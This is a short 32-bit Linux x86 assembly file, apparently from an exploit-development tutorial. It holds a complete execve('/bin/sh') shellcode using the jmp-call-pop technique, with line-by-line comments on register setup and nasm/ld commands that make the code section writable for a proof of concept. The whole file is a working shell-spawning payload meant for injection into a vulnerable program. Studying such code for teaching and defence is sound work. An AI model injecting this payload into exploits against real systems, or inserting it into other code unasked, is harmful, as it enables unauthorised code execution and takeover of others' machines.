; lnx-execve-callsub-x86_32.s
; A simple execve(2) shellcode with size optimization and a call subroutine to maintain registers values and the stack frame.
; When injected this shellcode will seg fault on a DEP enabled host because the .text section of the vulnerable program is not writeable.
; For the proof of concept, the .text section has been marked for execution and properly aligned (see nasm/linker parameters below).
;
; nasm -f elf32 lnx-execve-callsub-x86_32.s
; ld -m elf_i386 --omagic lnx-execve-callsub-x86_32.o -o lnx-execve-callsub-x86_32
BITS 32

Section	.text progbits alloc exec write ; make .text section writeable.

  global _start

  _start:
    jmp short	_caller

  scexecve:
    pop		esi			; POP the top of the stack to ESI, memory address of our string.
    xor		eax, eax		; Zero out EAX register.
    mov byte	[esi + 7], al		; Null terminate the '/bin/sh' filename string.
    lea		ebx, [esi]		; Copy the memory address of our string from the pointer in ESI to EBX.
    mov long	[esi + 8], ebx		; Copy the above address back at ESI + 8, our "A" placeholder.
    mov long	[esi + 12], eax		; Copy all nulls bytes from EAX to our null pointer at ESI +12. 
    mov byte	al, 0x0b		; Copy the execve(2) system call number to the AL register.
    mov		ebx, esi		; Copy the content of ESI register (memory address of our string) to EBX (argv1).
    lea		ecx, [esi + 8]		; Copy the filename string to ECX (argv3).
    lea		edx, [esi + 12]		; Copy the null register to EDX (argv2).
    int		0x80			; Interupt call vector 0x80.

  _caller:
    Call	scexecve
    db		'/bin/shNAAAANNNN'	; Placeholder: /bin/sh<null><pointer to filename string><4 x nulls>
